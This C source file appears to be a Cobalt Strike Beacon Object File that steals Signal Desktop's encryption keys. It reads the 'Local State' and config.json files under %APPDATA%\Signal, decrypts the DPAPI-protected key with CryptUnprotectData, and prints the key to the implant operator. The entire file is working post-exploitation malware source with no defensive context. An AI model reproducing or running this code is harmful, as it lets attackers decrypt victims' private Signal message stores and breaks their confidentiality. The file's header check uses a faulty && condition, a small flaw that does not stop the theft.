#include <windows.h>
#include <shlwapi.h>
#include <dpapi.h>
#include <stdint.h>
#include "beacon.h"


    DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI CRYPT32$CryptUnprotectData(DATA_BLOB*, LPWSTR*, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);
    DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
    DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
    DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
    DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
    DECLSPEC_IMPORT WINBASEAPI LPWSTR WINAPI SHLWAPI$PathCombineW(LPWSTR pszDest, LPCWSTR pszDir, LPCWSTR pszFile);
    DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI SHLWAPI$PathFileExistsW(LPCWSTR pszPath);
    DECLSPEC_IMPORT WINBASEAPI LPSTR WINAPI SHLWAPI$StrStrA(LPCSTR lpFirst, LPCSTR lpSrch);
    DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
    DECLSPEC_IMPORT WINBASEAPI void* WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
    DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
    DECLSPEC_IMPORT WINBASEAPI size_t __cdecl MSVCRT$strlen(const char* _Str);
    DECLSPEC_IMPORT WINBASEAPI void* __cdecl MSVCRT$memcpy(void* _Dst, const void*  _Src, size_t _MaxCount);
    DECLSPEC_IMPORT WINBASEAPI PCHAR __cdecl MSVCRT$strchr(const char* haystack, int needle);
    DECLSPEC_IMPORT WINBASEAPI int __cdecl MSVCRT$sprintf(char* __stream, const char* __format, ...);
    DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, PVOID);
    DECLSPEC_IMPORT WINBASEAPI HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL);
    DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$ExpandEnvironmentStringsW(LPCWSTR lpSrc, LPWSTR lpDst, DWORD nSize);
    DECLSPEC_IMPORT WINBASEAPI UINT WINAPI OLEAUT32$SysStringByteLen(BSTR bstr);
   

    #define CryptUnprotectData CRYPT32$CryptUnprotectData
    #define CreateFileW KERNEL32$CreateFileW
    #define GetLastError KERNEL32$GetLastError
    #define GetFileSize KERNEL32$GetFileSize
    #define ReadFile KERNEL32$ReadFile
    #define PathCombineW SHLWAPI$PathCombineW
    #define PathFileExistsW SHLWAPI$PathFileExistsW
    #define StrStrA SHLWAPI$StrStrA
    #define CloseHandle KERNEL32$CloseHandle
    #define HeapAlloc KERNEL32$HeapAlloc
    #define GetProcessHeap KERNEL32$GetProcessHeap
    #define strlen MSVCRT$strlen
    #define stchr MSVCRT$strchr
    #define sprintf MSVCRT$sprintf
    #define LocalFree KERNEL32$LocalFree
    #define ExpandEnvironmentStringsW KERNEL32$ExpandEnvironmentStringsW
    #define memcpy MSVCRT$memcpy
    #define SysStringByteLen OLEAUT32$SysStringByteLen



    #define intAlloc(size) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size)
    #define intFree(addr) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, addr)

    const char* BASE64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
#define KEY_SIZE 32

    static const char encoding_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    static const int mod_table[] = { 0, 2, 1 };

    char* base64_encode(const BYTE* data, size_t input_length) {
        size_t output_length = 4 * ((input_length + 2) / 3);
        char* encoded_data = (char*)intAlloc(output_length + 1);
        if (encoded_data == NULL) return NULL;

        for (size_t i = 0, j = 0; i < input_length;) {
            uint32_t octet_a = i < input_length ? data[i++] : 0;
            uint32_t octet_b = i < input_length ? data[i++] : 0;
            uint32_t octet_c = i < input_length ? data[i++] : 0;

            uint32_t triple = (octet_a << 16) | (octet_b << 8) | octet_c;

            encoded_data[j++] = encoding_table[(triple >> 18) & 0x3F];
            encoded_data[j++] = encoding_table[(triple >> 12) & 0x3F];
            encoded_data[j++] = encoding_table[(triple >> 6) & 0x3F];
            encoded_data[j++] = encoding_table[triple & 0x3F];
        }

        for (size_t i = 0; i < mod_table[input_length % 3]; i++) {
            encoded_data[output_length - 1 - i] = '=';
        }

        encoded_data[output_length] = '\0';
        return encoded_data;
    }


    int isBase64(char c) {
        return (c >= 'A' && c <= 'Z') ||    // Uppercase letters
            (c >= 'a' && c <= 'z') ||    // Lowercase letters
            (c >= '0' && c <= '9') ||    // Digits
            (c == '+') || (c == '/');    // '+' and '/'
    }

    uint8_t* Base64Decode(const char* encoded_string, size_t* out_len) {
        int in_len = MSVCRT$strlen(encoded_string);
        int i = 0, j = 0, in_ = 0;
        uint8_t char_array_4[4], char_array_3[3];
        size_t decoded_size = (in_len * 3) / 4;
        uint8_t* decoded_data = (uint8_t*)intAlloc(decoded_size);

        *out_len = 0;
        while (in_len-- && (encoded_string[in_] != '=') && isBase64(encoded_string[in_])) {
            char_array_4[i++] = encoded_string[in_]; in_++;
            if (i == 4) {
                for (i = 0; i < 4; i++) char_array_4[i] = MSVCRT$strchr(BASE64_CHARS, char_array_4[i]) - BASE64_CHARS;
                char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
                char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
                char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

                for (i = 0; i < 3; i++) decoded_data[(*out_len)++] = char_array_3[i];
                i = 0;
            }
        }

        if (i) {
            for (j = i; j < 4; j++) char_array_4[j] = 0;
            for (j = 0; j < 4; j++) char_array_4[j] = MSVCRT$strchr(BASE64_CHARS, char_array_4[j]) - BASE64_CHARS;
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (j = 0; j < i - 1; j++) decoded_data[(*out_len)++] = char_array_3[j];
        } 
        return decoded_data;
    }


    DWORD SignalKeyDecryption(const char* encoded_data, long decode_size)
    {
        DWORD dwErrorCode = ERROR_SUCCESS;
        unsigned char* decoded_data = NULL;
        char* encoded = NULL;
        DATA_BLOB DataOut = { 0 };
        DATA_BLOB DataVerify = { 0 };
        LPWSTR pDescrOut = NULL;

        decoded_data = Base64Decode(encoded_data, (size_t*)&decode_size);
        if (decoded_data == NULL)
        {
            dwErrorCode = ERROR_DS_DECODING_ERROR;
            BeaconPrintf(CALLBACK_ERROR,"base64_decode failed\n");
            goto chromeKey_end;
        }

        if (decode_size < 5)
        {
            dwErrorCode = ERROR_DS_DECODING_ERROR;
            BeaconPrintf(CALLBACK_ERROR, "base64_decode failed\n");
            goto chromeKey_end;
        }

        if (decoded_data[0] != 'D' && decoded_data[1] != 'P')
        {
            dwErrorCode = ERROR_DS_DECODING_ERROR;
            BeaconPrintf(CALLBACK_ERROR,"base64_decode failed\n");
            goto chromeKey_end;
        }
        DataOut.pbData = decoded_data + 5;
        DataOut.cbData = decode_size - 5;

        if (!CryptUnprotectData(&DataOut,&pDescrOut,NULL,NULL,NULL,0,&DataVerify))
        {
            dwErrorCode = ERROR_DECRYPTION_FAILED;
            BeaconPrintf(CALLBACK_ERROR,"CryptUnprotectData failed\n");
            goto chromeKey_end;
        }


        encoded = base64_encode(DataVerify.pbData, DataVerify.cbData);
        if (encoded == NULL)
        {
            dwErrorCode = ERROR_DS_ENCODING_ERROR;
            BeaconPrintf(CALLBACK_ERROR,"base64_encode failed\n");
            goto chromeKey_end;
        }

        BeaconPrintf(CALLBACK_OUTPUT,"Decrypted encryption key as: %s\n", encoded);

    chromeKey_end:

        if (encoded)
        {
            intFree(encoded);
            encoded = NULL;
        }

        if (decoded_data)
        {
            intFree(decoded_data);
            decoded_data = NULL;
        }

        if (DataVerify.pbData)
        {
            LocalFree(DataVerify.pbData);
            DataVerify.pbData = NULL;
        }

        return dwErrorCode;
    }

    DWORD RetrieveConfigKeyString(LPCWSTR signalPath) {
        DWORD dwErrorCode = ERROR_SUCCESS;
        HANDLE fp = NULL;
        DWORD filesize = 0;
        DWORD read = 0, totalread = 0;
        BYTE* filedata = 0, * key = 0;
        char* start = NULL;
        char* end = NULL;
        DWORD keylen = 0;


        fp = CreateFileW(signalPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (fp == INVALID_HANDLE_VALUE)
        {
            dwErrorCode = GetLastError();
            BeaconPrintf(CALLBACK_ERROR, "CreateFileW failed %lX\n", dwErrorCode);
            goto findKeyBlob_end;
        }
        filesize = GetFileSize(fp, NULL);
        if (filesize == INVALID_FILE_SIZE)
        {
            dwErrorCode = GetLastError();
            BeaconPrintf(CALLBACK_ERROR, "GetFileSize failed %lX\n", dwErrorCode);
            goto findKeyBlob_end;
        }

        filedata = (BYTE*)intAlloc(filesize);
        if (NULL == filedata)
        {
            dwErrorCode = ERROR_OUTOFMEMORY;
            BeaconPrintf(CALLBACK_ERROR, "intAlloc failed %lX\n", dwErrorCode);
            goto findKeyBlob_end;
        }
        while (totalread != filesize)
        {
            if (!ReadFile(fp, filedata + totalread, filesize - totalread, &read, NULL))
            {
                dwErrorCode = GetLastError();
                BeaconPrintf(CALLBACK_ERROR, "ReadFile failed %lX\n", dwErrorCode);
                goto findKeyBlob_end;
            }
            totalread += read;
            read = 0;
        }

        //now we need to find our key
        start = StrStrA((char*)filedata, "encryptedKey");
        if (start == NULL)
        {
            dwErrorCode = ERROR_BAD_FILE_TYPE;
            BeaconPrintf(CALLBACK_ERROR, "StrStrA failed %lX\n", dwErrorCode);
            goto findKeyBlob_end;
        }
        start += 16; //gets us to start of base64 string;

        end = StrStrA(start, "\"\n");
        if (end == NULL)
        {
            dwErrorCode = ERROR_BAD_FILE_TYPE;
            BeaconPrintf(CALLBACK_ERROR, "StrStrA failed %lX\n", dwErrorCode);
            goto findKeyBlob_end;
        }
        keylen = end - start;

        key = (BYTE*)intAlloc(keylen + 1);
        if (key == NULL)
        {
            dwErrorCode = ERROR_OUTOFMEMORY;
            BeaconPrintf(CALLBACK_ERROR, "intAlloc failed %lX\n", dwErrorCode);
            goto findKeyBlob_end;
        }

        memcpy(key, start, keylen);

        BeaconPrintf(CALLBACK_OUTPUT, "Base64 config key for %S =\n%s\n", signalPath, key);


    findKeyBlob_end:

        if (filedata)
        {
            intFree(filedata);
            filedata = NULL;
        }

        if (key)
        {
            intFree(key);
            key = NULL;
        }

        if ((fp != NULL) && (fp != INVALID_HANDLE_VALUE))
        {
            CloseHandle(fp);
            fp = NULL;
        }

        return dwErrorCode;
    }

    DWORD RetrieveKeyBlob(LPCWSTR signalPath) {
        DWORD dwErrorCode = ERROR_SUCCESS;
        HANDLE fp = NULL;
        DWORD filesize = 0;
        DWORD read = 0, totalread = 0;
        BYTE* filedata = 0, * key = 0;
        char* start = NULL;
        char* end = NULL;
        DWORD keylen = 0;


        fp = CreateFileW(signalPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (fp == INVALID_HANDLE_VALUE)
        {
            dwErrorCode = GetLastError();
            BeaconPrintf(CALLBACK_ERROR,"CreateFileW failed %lX\n", dwErrorCode);
            goto findKeyBlob_end;
        }
        filesize = GetFileSize(fp, NULL);
        if (filesize == INVALID_FILE_SIZE)
        {
            dwErrorCode = GetLastError();
            BeaconPrintf(CALLBACK_ERROR,"GetFileSize failed %lX\n", dwErrorCode);
            goto findKeyBlob_end;
        }

        filedata = (BYTE*)intAlloc(filesize);
        if (NULL == filedata)
        {
            dwErrorCode = ERROR_OUTOFMEMORY;
            BeaconPrintf(CALLBACK_ERROR,"intAlloc failed %lX\n", dwErrorCode);
            goto findKeyBlob_end;
        }
        while (totalread != filesize)
        {
            if (!ReadFile(fp, filedata + totalread, filesize - totalread, &read, NULL))
            {
                dwErrorCode = GetLastError();
                BeaconPrintf(CALLBACK_ERROR,"ReadFile failed %lX\n", dwErrorCode);
                goto findKeyBlob_end;
            }
            totalread += read;
            read = 0;
        }

        //now we need to find our key
        start = StrStrA((char*)filedata, "encrypted_key");
        if (start == NULL)
        {
            dwErrorCode = ERROR_BAD_FILE_TYPE;
            BeaconPrintf(CALLBACK_ERROR,"StrStrA failed %lX\n", dwErrorCode);
            goto findKeyBlob_end;
        }
        start += 16; //gets us to start of base64 string;

        end = StrStrA(start, "\"}");
        if (end == NULL)
        {
            dwErrorCode = ERROR_BAD_FILE_TYPE;
            BeaconPrintf(CALLBACK_ERROR,"StrStrA failed %lX\n", dwErrorCode);
            goto findKeyBlob_end;
        }
        keylen = end - start;

        key = (BYTE*)intAlloc(keylen + 1);
        if (key == NULL)
        {
            dwErrorCode = ERROR_OUTOFMEMORY;
            BeaconPrintf(CALLBACK_ERROR,"intAlloc failed %lX\n", dwErrorCode);
            goto findKeyBlob_end;
        }

        memcpy(key, start, keylen);

        dwErrorCode = SignalKeyDecryption((char*)key, keylen);
        if (ERROR_SUCCESS != dwErrorCode)
        {
            BeaconPrintf(CALLBACK_ERROR, "SignalKeyDecryption Function failed %lX\n", dwErrorCode);
            goto findKeyBlob_end;
        }


    findKeyBlob_end:

        if (filedata)
        {
            intFree(filedata);
            filedata = NULL;
        }
        
        if (key)
        {
            intFree(key);
            key = NULL;
        }

        if ((fp != NULL) && (fp != INVALID_HANDLE_VALUE))
        {
            CloseHandle(fp);
            fp = NULL;
        }

        return dwErrorCode;
    }

    DWORD RetrieveSignalKey() {
        DWORD dwErrorCode = ERROR_SUCCESS;
        wchar_t appdata[MAX_PATH] = { 0 };
        wchar_t signal[MAX_PATH] = { 0 };

        if (0 == ExpandEnvironmentStringsW(L"%APPDATA%", appdata, MAX_PATH))
        {
            dwErrorCode = GetLastError();
            goto retrievesignalkey_end;
        }
        if (NULL == PathCombineW(signal, appdata, L"Signal\\Local State"))
        {
            dwErrorCode = ERROR_BAD_PATHNAME;
            goto retrievesignalkey_end;
        }
        if (PathFileExistsW(signal))
        {
            dwErrorCode = RetrieveKeyBlob(signal);
            if (ERROR_SUCCESS != dwErrorCode)
            {
                BeaconPrintf(CALLBACK_ERROR, "Retrieving Key from file failed %lX\n", dwErrorCode);
                //goto findKeyFiles_end;
            }
        }
        else
        {
            BeaconPrintf(CALLBACK_ERROR, "Could not find Signal's local state file\n");
        }
    retrievesignalkey_end:
        return dwErrorCode;
    }

    DWORD RetrieveConfigKey() {
        DWORD dwErrorCode = ERROR_SUCCESS;
        wchar_t appdata[MAX_PATH] = { 0 };
        wchar_t signal[MAX_PATH] = { 0 };

        if (0 == ExpandEnvironmentStringsW(L"%APPDATA%", appdata, MAX_PATH))
        {
            dwErrorCode = GetLastError();
            goto retrieveconfigkey_end;
        }
        if (NULL == PathCombineW(signal, appdata, L"Signal\\config.json"))
        {
            dwErrorCode = ERROR_BAD_PATHNAME;
            goto retrieveconfigkey_end;
        }
        if (PathFileExistsW(signal))
        {
            dwErrorCode = RetrieveConfigKeyString(signal);
            if (ERROR_SUCCESS != dwErrorCode)
            {
                BeaconPrintf(CALLBACK_ERROR, "Retrieving Key from file failed %lX\n", dwErrorCode);
                //goto findKeyFiles_end;
            }
        }
        else
        {
            BeaconPrintf(CALLBACK_ERROR, "Could not find Signal's local state file\n");
        }
    retrieveconfigkey_end:
        return dwErrorCode;
    }

    void go() {
        DWORD dwErrorCode = ERROR_SUCCESS;
        dwErrorCode = RetrieveSignalKey();
        if (ERROR_SUCCESS != dwErrorCode)
        {
            BeaconPrintf(CALLBACK_ERROR, "RetrieveSignalKey failed: %lX\n", dwErrorCode);
        }
        dwErrorCode = RetrieveConfigKey();
        if (ERROR_SUCCESS != dwErrorCode)
        {
            BeaconPrintf(CALLBACK_ERROR, "RetrieveConfigKey failed: %lX\n", dwErrorCode);
        }

    }